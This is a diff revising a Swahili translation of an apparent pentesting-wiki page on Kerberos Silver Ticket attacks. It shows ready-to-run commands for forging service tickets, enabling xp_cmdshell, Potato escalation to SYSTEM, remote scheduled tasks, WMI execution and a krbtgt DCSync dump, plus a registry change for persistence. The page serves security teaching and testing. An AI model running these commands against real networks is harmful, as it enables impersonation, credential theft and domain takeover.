@@ -6,14 +6,15 @@
 
 ## Silver ticket
 
-Shambulio la **Silver Ticket** linahusisha matumizi mabaya ya service tickets katika Active Directory (AD) mazingira. Mbinu hii inategemea **kupata NTLM hash ya service account**, kama account ya kompyuta, ili kutengeneza Ticket Granting Service (TGS) ticket. Kwa ticket hii iliyotengenezwa, mshambuliaji anaweza kupata huduma maalumu kwenye mtandao, **kujifanya mtumiaji yeyote**, kwa kawaida akilenga vibali vya kiutawala. Inasisitizwa kwamba kutumia AES keys kutengeneza tiketi ni salama zaidi na kunagundulika kwa shida.
+Shambulio la **Silver Ticket** linahusisha matumizi mabaya ya service tickets katika mazingira ya Active Directory (AD). Njia hii inategemea **kupata NTLM hash ya akaunti ya huduma**, kama vile akaunti ya kompyuta, ili kutengeneza Ticket Granting Service (TGS) ticket. Kwa tiketi hii iliyotengenezwa kwa ulaghai, mshambuliaji anaweza kupata huduma maalum kwenye mtandao, **kuigiza mtumiaji yoyote**, kwa kawaida akilenga vibali vya kiutawala. Inasisitizwa kwamba kutumia AES keys kwa kutengeneza tiketi ni salama zaidi na inayotambulika kwa ukosefu mdogo.
 
 > [!WARNING]
-> Silver Tickets zinaonekana kwa ugunduzi mdogo kuliko Golden Tickets kwa sababu zinahitaji tu **hash ya service account**, sio akaunti ya krbtgt. Hata hivyo, zimepungukiwa kwa huduma maalumu wanayolenga. Aidha, ikiwa utaiba nenosiri la akaunti yenye SPN unaweza kutumia nenosiri hilo kuunda Silver Ticket inayojifanya mtumiaji yeyote kwa huduma hiyo.
+> Silver Tickets ni ngumu kugunduliwa kuliko Golden Tickets kwa sababu zinahitaji tu **hash ya akaunti ya huduma**, si akaunti ya krbtgt. Hata hivyo, zina kikomo kwa huduma maalum wanayolenga. Pia, hata kuiba tu nenosiri la mtumiaji kunaweza kutosha.
+> Zaidi ya hayo, ikiwa utapora **nenosiri la akaunti lenye SPN** unaweza kutumia nenosiri hilo kutengeneza Silver Ticket inayomfanya mtu awe mtumiaji yoyote kwa huduma hiyo.
 
-Kwa utengenezaji wa tiketi, zana tofauti zinatumiwa kulingana na mfumo wa uendeshaji:
+Kwa kutengeneza tiketi, zana mbalimbali zinatumika kulingana na mfumo wa uendeshaji:
 
-### Kwenye Linux
+### On Linux
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
@@ -36,11 +37,11 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-Huduma ya CIFS imeonyeshwa kama lengo la kawaida la kupata mfumo wa faili wa mwathiriwa, lakini huduma nyingine kama HOST na RPCSS pia zinaweza kutumika kwa ajili ya kazi na maombi ya WMI.
+Huduma ya CIFS imeangaziwa kama lengo la kawaida la kupata mfumo wa faili wa mwathiriwa, lakini huduma nyingine kama HOST na RPCSS pia zinaweza kutumiwa kwa ajili ya kazi na maswali ya WMI.
 
-### Example: MSSQL service (MSSQLSvc) + Potato to SYSTEM
+### Mfano: huduma ya MSSQL (MSSQLSvc) + Potato hadi SYSTEM
 
-Kama una hash ya NTLM (au ufunguo wa AES) wa akaunti ya huduma ya SQL (kwa mfano, sqlsvc) unaweza kutengeneza TGS kwa MSSQL SPN na kujifanya mtumiaji yeyote kwa huduma ya SQL. Kutoka hapo, wezesha xp_cmdshell ili kutekeleza amri kama akaunti ya huduma ya SQL. Ikiwa token hiyo ina SeImpersonatePrivilege, unganisha Potato ili kupandisha hadhi hadi SYSTEM.
+Ikiwa una hash ya NTLM (au ufunguo wa AES) wa akaunti ya huduma ya SQL (mfano, sqlsvc), unaweza kutengeneza TGS kwa MSSQL SPN na kuiga mtumiaji yeyote kwa huduma ya SQL. Kutoka hapo, wezesha xp_cmdshell ili kutekeleza amri kama akaunti ya huduma ya SQL. Ikiwa token hiyo ina SeImpersonatePrivilege, fanya mnyororo wa Potato ili kuinua cheo hadi SYSTEM.
 ```bash
 # Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
 python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
@@ -51,14 +52,14 @@ export KRB5CCNAME=$PWD/administrator.ccache
 impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
 -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
 ```
-- Ikiwa muktadha unaopatikana una SeImpersonatePrivilege (mara nyingi ni kweli kwa akaunti za huduma), tumia toleo la Potato kupata SYSTEM:
+- Ikiwa muktadha uliopatikana una SeImpersonatePrivilege (mara nyingi kweli kwa service accounts), tumia Potato variant ili kupata SYSTEM:
 ```bash
 # On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
 PrintSpoofer.exe -c "cmd /c whoami"
 # or
 GodPotato -cmd "cmd /c whoami"
 ```
-Maelezo zaidi kuhusu kutumia vibaya MSSQL na kuwezesha xp_cmdshell:
+Maelezo zaidi kuhusu kutumia MSSQL na kuwezesha xp_cmdshell:
 
 {{#ref}}
 abusing-ad-mssql.md
@@ -72,14 +73,14 @@ Muhtasari wa mbinu za Potato:
 
 ## Huduma Zinazopatikana
 
-| Service Type                               | Service Silver Tickets                                                     |
+| Aina ya Huduma                            | Service Silver Tickets                                                     |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Kulingana na OS pia:</p><p>WSMAN</p><p>RPCSS</p>  |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Katika baadhi ya matukio unaweza kuomba tu: WINRM</p> |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Kulingana na OS pia:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Kwa baadhi ya wakati unaweza kuomba tu: WINRM</p> |
 | Scheduled Tasks                            | HOST                                                                       |
 | Windows File Share, also psexec            | CIFS                                                                       |
-| LDAP operations, included DCSync           | <p>LDAP</p><p>ikiwa ni pamoja na DCSync</p>                                 |
+| LDAP operations, included DCSync           | LDAP                                                                       |
 | Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
 | Golden Tickets                             | krbtgt                                                                     |
 
@@ -87,23 +88,23 @@ Using **Rubeus** you may **ask for all** these tickets using the parameter:
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Vitambulisho vya Matukio vya Silver Tickets
+### Silver tickets Vitambulisho vya Tukio
 
 - 4624: Kuingia kwa Akaunti
-- 4634: Kuondoka/Kutoka kwa Akaunti
+- 4634: Kutoka kwa Akaunti
 - 4672: Kuingia kwa Admin
 
 ## Uendelevu
 
-Ili kuzuia mashine zisibadilishe nywila kila baada ya siku 30 weka `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` au unaweza kuweka `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` kwa thamani kubwa kuliko siku 30 kuonyesha kipindi cha mzunguko ambacho nywila ya mashine inapaswa kubadilishwa.
+Ili kuzuia mashine zizungushe nywila zao kila 30 days weka `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` au unaweza kuweka `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` kuwa thamani kubwa kuliko 30days ili kuonyesha kipindi cha mzunguko ambapo nywila ya mashine inapaswa kugeuzwa.
 
-## Abusing Service tickets
+## Kutumia tikiti za huduma
 
-Katika mifano iliyofuata tufikirie tiketi imepatikana kwa kuigiza akaunti ya administrator.
+Katika mifano ifuatayo hebu tufikirie kuwa tikiti imetolewa kwa kuiga akaunti ya msimamizi.
 
 ### CIFS
 
-Kwa tiketi hii utaweza kufikia folda za `C$` na `ADMIN$` kupitia **SMB** (ikiwa zime wazi) na kunakili mafaili kwenye sehemu ya mfumo wa faili wa mbali kwa kufanya kitu kama:
+Ukitumia tikiti hii utaweza kupata ufikivu kwenye folda `C$` na `ADMIN$` kupitia **SMB** (ikiwa zimefunuliwa) na kunakili faili kwenye sehemu ya mfumo wa faili ya mbali kwa kufanya kitu kama:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
@@ -117,7 +118,7 @@ Pia utaweza kupata shell ndani ya host au kutekeleza amri zozote kwa kutumia **p
 
 ### HOST
 
-Kwa ruhusa hii unaweza kuunda kazi zilizopangwa kwenye kompyuta za mbali na kutekeleza amri zozote:
+Kwa ruhusa hii unaweza kuunda scheduled tasks kwenye remote computers na execute arbitrary commands:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -131,7 +132,7 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
 ### HOST + RPCSS
 
-Kwa tikiti hizi unaweza **kutekeleza WMI kwenye mfumo wa mwathiriwa**:
+Kwa tiketi hizi unaweza **kutekeleza WMI katika mfumo wa mwathiri**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -150,11 +151,11 @@ Pata **maelezo zaidi kuhusu wmiexec** kwenye ukurasa ufuatao:
 
 ### HOST + WSMAN (WINRM)
 
-Ikiwa una ufikiaji wa winrm kwenye kompyuta unaweza **kuifikia** na hata kupata PowerShell:
+Kwa ufikiaji wa winrm kwenye kompyuta unaweza **kuifikia** na hata kupata PowerShell:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-Check the following page to learn **njia zaidi za kuunganishwa na mwenyeji wa mbali ukitumia winrm**:
+Angalia ukurasa ufuatao ili kujifunza **njia zaidi za kuunganisha na mwenyeji wa mbali kutumia winrm**:
 
 
 {{#ref}}
@@ -162,15 +163,15 @@ Check the following page to learn **njia zaidi za kuunganishwa na mwenyeji wa mb
 {{#endref}}
 
 > [!WARNING]
-> Kumbuka kwamba **winrm lazima iwe imewezeshwa na ikisikiliza** kwenye kompyuta ya mbali ili kuifikia.
+> Kumbuka kwamba **winrm lazima iwe hai na ikisikiliza** kwenye kompyuta ya mbali ili kuifikia.
 
 ### LDAP
 
-Kwa ruhusa hii unaweza dump DC database ukitumia **DCSync**:
+Kwa ruhusa hii unaweza dump hifadhidata ya DC ukitumia **DCSync**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
-**Jifunze zaidi kuhusu DCSync** katika ukurasa ufuatao:
+**Jifunze zaidi kuhusu DCSync** kwenye ukurasa ufuatao:
 
 
 {{#ref}}
@@ -178,7 +179,7 @@ dcsync.md
 {{#endref}}
 
 
-## Marejeo
+## Marejeleo
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
